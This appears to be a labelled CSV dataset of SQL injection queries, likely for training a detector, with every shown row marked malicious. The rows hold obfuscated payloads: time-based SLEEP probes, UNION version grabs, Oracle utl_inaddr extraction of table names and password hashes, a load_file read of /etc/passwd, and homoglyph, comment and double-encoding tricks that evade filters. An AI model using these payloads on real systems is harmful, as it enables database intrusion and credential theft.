Query,Label
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2522%2520or%2520pg_sleep%2520%2520%2528%2520%2520__TIME__%2520%2520%2529%2520%2520--,1
creаte%2520user%2520nаme%2520identified%2520by%2520pаss123%2520tempo/**/rаry%2520tаblespаce%2520temp%2520defаult%2520tаblespаce%2520users%253B,1
%2520A/%252A%252A/ND%25201%2520%2520%253D%2520%2520utl_in%25D0%25B0ddr.get_host_%25D0%25B0ddress%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SE/%252A%252A/LECT%2520DISTINCT%2520%2520%2528%2520%2520t%25D0%25B0ble_n%25D0%25B0me%2520%2520%2529%2520%2520%2520FR/%252A%252A/%25CE%259FM%2520%2520%2520%2528%2520%2520SE/%252A%252A/LECT%2520DISTINCT%2520%2520%2528%2520%2520t%25D0%25B0ble_n%25D0%25B0me%2520%2520%2529%2520%2520%252C%2520R%25CE%259FWNUM%2520AS%2520LIMIT%2520FR/%252A%252A/%25CE%259FM%2520sys.%25D0%25B0ll_t%25D0%25B0bles%2520%2520%2529%2520%2520%2520W/%252A%252A/HERE%2520LIMIT%2520%2520%253D%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520A/%252A%252A/ND%2520%25E2%2580%2599i%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599i,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25E2%2580%25991%25E2%2580%2599%2520or%2520%2540%2520%25401%2520%2520%253D%2520%25201%2520union%2520select%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%25E2%2580%2599,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)-- se/**/lect nаme fr/**/om syscolumns w/**/here id   =     (  se/**/lect id fr/**/om sysobjects w/**/here nаme   =   tаblenаme’  )  --",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520%252B%2524%252B%2520or%25201%2520%2520%253D%2520%25201%2520--%25201,1
"SELECT * FRΟM (SELECT ’1;  (  loаd_file  (  chаr  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;’) AS benign_sub",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25271%2527%2520or%2520%257C%257C/1%2520%2520%253D%2520%25201%2520union%2520select%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%2527%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT ' se/**/lect * fr/**/om users w/**/here id  =  '1' o/**/r \.<\ un/**/ion se/**/lect 1,@@VERSION -- 1'') AS benign_sub",1
%253F%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--,1
SELECT * FROM (SELECT '%2520%2529%2520%2520%2520or%2520%2520%2520%2528%2520%2520%2527а%2527%2520%2520%253D%2520%2520%2527а') AS benign_sub,1
SE/**/LECT * FRΟM (SE/**/LECT ’аdmin’ o/**/r 1  =  1#’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%2520%2520%2528%2520%2520%255D%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201",1
SE/**/LECT * FRΟM (SE/**/LECT ’o/**/r 1  =  1 --’) AS benign_sub,1
SELECT * FROM (SELECT '%2520AND%25201%2520%2520%253D%2520%2520utl_in%25D0%25B0ddr.get_host_%25D0%25B0ddress%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SELECT%2520DISTINCT%2520%2520%2528%2520%2520column_n%25D0%25B0me%2520%2520%2529%2520%2520%2520FR%25CE%259FM%2520%2520%2520%2528%2520%2520SELECT%2520DISTINCT%2520%2520%2528%2520%2520column_n%25D0%25B0me%2520%2520%2529%2520%2520%252C%2520R%25CE%259FWNUM%2520AS%2520LIMIT%2520FR%25CE%259FM%2520%25D0%25B0ll_t%25D0%25B0b_columns%2520%2520%2529%2520%2520%2520WHERE%2520LIMIT%2520%2520%253D%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520AND%2520%25E2%2580%2599i%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599i') AS benign_sub,1
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25271%2527%2520%2525%2521%253C%2540%2520union%2520select%25201%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%2527') AS benign_sub,1
"SELECT * FROM (SELECT ' se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""&  (  "" o/**/r 1  =  1 -- 1') AS benign_sub",1
%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%2522%253F%2520%2520%2528%2520%2520%2522%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201,1
"IF(1=1, SLEEP(5), 0)--distinct",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT 'select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25271%2527%2520%252A%2520%2520%2528%2520%2520%255C%2520%2520%2529%2520%2520%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%2527') AS benign_sub",1
SELECT * FROM (SELECT '1%2520a/**/nd%2520ascii%2520%2520%2528%2520%2520lower%2520%2520%2528%2520%2520substring%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520se/**/lect%2520top%25201%2520name%2520fr/**/om%2520sysobjects%2520w/**/here%2520xtype%2520%2520%253D%2520%2520%2527u%2527%2520%2520%2529%2520%2520%252C%25201%252C%25201%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%253E%2520116') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%255C.%253C%255C%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201",1
"IF(1=1, SLEEP(5), 0)--аdmin%2522%2520or%2520%25221%2522%2520%2520%253D%2520%2520%25221%2522--",1
"IF(1=1, SLEEP(5), 0)-- se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r ""%{"" o/**/r 1  =  1 -- 1",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT 'insert') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%25201%2523%2522%253F%2520%2520%253D%2520%25201%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201,1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%2525%253F%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
%2520A/**/ND%25201%2520%2520%253D%2520%2520utl_in%25D0%25B0ddr.get_host_%25D0%25B0ddress%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520SE/**/LECT%2520DISTINCT%2520%2520%2528%2520%2520PASSW%25CE%259FRD%2520%2520%2529%2520%2520%2520FR%25CE%259FM%2520%2520%2520%2528%2520%2520SE/**/LECT%2520DISTINCT%2520%2520%2528%2520%2520PASSW%25CE%259FRD%2520%2520%2529%2520%2520%252C%2520R%25CE%259FWNUM%2520AS%2520LIMIT%2520FR%25CE%259FM%2520SYS.USER%2524%2520%2520%2529%2520%2520%2520W/**/HERE%2520LIMIT%2520%2520%253D%2520%25208%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520A/**/ND%2520%25E2%2580%2599i%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599i,1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%253F%2523%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--or%25201%2520%2520%253D%2520%25201%2520or%2520%2522%2522%2520%2520%253D%2520%2520,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527/%252A%252A/or/%252A%252A/1/%252A%252A/%2520%2520%253D%2520%2520/%252A%252A/1%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r "".  (  "" o/**/r 1  =  1 -- 1') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%2520%25271%2527%2520un/%252A%252A/ion%2520se/%252A%252A/lect%2520%257C%257C/1%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201%2527,1
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25271%2527%2520union%2520select%2520%252B%255C.%252C%2540%2540VERSION%2520--%25201%2527') AS benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--or%25201%2520%2520%253D%2520%25201/%252A%2527%2529%2520AS%2520benign_sub,1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%2527%252527%2520or%25201%2520%2520%253D%2520%25201%2527%2529%2520AS%2520benign_sub,1
"SELECT * FRΟM (SELECT ’ se/**/lect * fr/**/om users w/**/here id  =  1 <@&@ un/**/ion se/**/lect 1,version  (    )   -- 1’) AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)-- select * from users where id  =  ’1’ union select $*$,@@VERSIΟN -- 1’') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%253B%2520%2520%2528%2520%2520load_file%2520%2520%2528%2520%2520char%2520%2520%2528%2520%252047%252C101%252C116%252C99%252C47%252C112%252C97%252C115%252C%2520...%2527%2529%2520AS%2520benign_sub,1
"SE/**/LECT * FR/**/OM (SE/**/LECT ' se/**/lect * fr/**/om users w/**/here id  =  ’1’ o/**/r $ 1  =  1 un/**/ion se/**/lect 1,@@VERSIΟN -- 1’') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%255C.%253C1%2520or%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25271%2527%2520or%2520%255C%253C%255C%2520union%2520select%25201%252C%2540%2540VERSIΟN%2520--%25201%2527",1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520union%2520select%25201%257C%257C1%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201') AS benign_sub,1
%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520%257C%257C1%2520un/**/ion%2520se/**/lect%2520null%252Cbаnner%2520fr/**/om%2520v%2524version%2520w/**/here%2520rownum%2520%2520%253D%2520%25201%2520--%25201,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT 'se/**/lect * fr/**/om users w/**/here id  =  '1' o/**/r \.<\ o/**/r 1  =  1 -- 1'') AS benign_sub",1
SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%255D%257B%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub,1
%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%2522.%2540%2522%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201,1
%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520o/**/r%2520%2522%2524%255B%2522%2520o/**/r%25201%2520%2520%253D%2520%25201%2520--%25201,1
"IF(1=1, SLEEP(5), 0)--o/**/r%25201%2520--%2527",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%252C%253B%2522%2520or%25201%2520%2520%253D%2520%25201%2520--%25201,1
SELECT * FRΟM (SELECT ’аdmin%2522%2520or%25201%2520%2520%253D%2520%25201%2523’) AS benign_sub,1
%2520se/**/lect%2520%252A%2520fr/**/om%2520users%2520w/**/here%2520id%2520%2520%253D%2520%25201%2520%252B%2520%2520%2528%2520%25201%2520%2520%2529%2520%2520%2520un/**/ion%2520se/**/lect%2520null%252Cb%25D0%25B0nner%2520fr/**/om%2520v%2524version%2520w/**/here%2520rownum%2520%2520%253D%2520%25201%2520--%25201,1
SELECT * FROM (SELECT '\x27UN/**/IΟN SE/**/LECT') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--PRINT') AS benign_sub",1
SELECT%2520%252A%2520FR%25CE%259FM%2520%2528SELECT%2520%25E2%2580%2599%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%2520%25E2%2580%25991%25E2%2580%2599%2520union%2520select%2520%2520%2520%2528%2520%2520%255C.%2520%2520%2529%2520%2520%252C%2540%2540VERSI%25CE%259FN%2520--%25201%25E2%2580%2599%25E2%2580%2599%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--o/%252A%252A/r%25201%2520%2520%253D%2520%25201--,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1 o/**/r pg_sleep  (  __TIME__  )  --') AS benign_sub",1
"SELECT * FRΟM (SELECT ’IF(1=1, SLEEP(5), 0)-- select * from users where id  =  1 or "",#"" or 1  =  1 -- 1’) AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--admin%2527%2520%2520%2529%2520%2520%2520o/%252A%252A/r%2520%2520%2520%2528%2520%2520%25271%2527%2520%2520%253D%2520%2520%25271%2527/%252A,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT 'or%25202%2520between%25201%2520and%25203') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520or%2520%2522%2520%2520%2529%2520%2520.%2522%2520%2520%253D%2520%25201%2520or%25201%2520%2520%253D%2520%25201%2520--%25201') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’ select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--аdmin’ o/**/r ’1’  =  ’1",1
%253B%2520if%2520not%2520%2520%2528%2520%2520se/%252A%252A/lect%2520system_user%2520%2520%2529%2520%2520%2520%253C%253E%2520%25E2%2580%2599s%25D0%25B0%25E2%2580%2599%2520w%25D0%25B0itfo/%252A%252A/r%2520del%25D0%25B0y%2520%25E2%2580%25990%253A0%253A2%25E2%2580%2599%2520--,1
"SELECT * FROM (SELECT ' se/**/lect * fr/**/om users w/**/here id  =  1 un/**/ion se/**/lect 1,bаnner fr/**/om v$version w/**/here rownum  =  1 -- 1') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--"" o/**/r 0  =  0 --",1
"IF(1=1, SLEEP(5), 0)--%2520select%2520%252A%2520from%2520users%2520where%2520id%2520%2520%253D%2520%25201%2520union%2520select%2520%2540%2520%2524_%252Cversion%2520%2520%2528%2520%2520%2520%2520%2529%2520%2520%2520--%25201",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--se/**/lect * fr/**/om users w/**/here id  =  1 <@.$ o/**/r 1  =  1 -- 1') AS benign_sub",1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520users%2520w/%252A%252A/here%2520id%2520%2520%253D%2520%25201%2520o/%252A%252A/r%2520%2522%2525.%2522%2520o/%252A%252A/r%25201%2520%2520%253D%2520%25201%2520--%25201%2527%2529%2520AS%2520benign_sub,1
"SELECT * FRΟM (SELECT ’ se/**/lect * fr/**/om users w/**/here id  =  1 + $+*$ un/**/ion se/**/lect null,@@VERSIΟN -- 1’) AS benign_sub",1
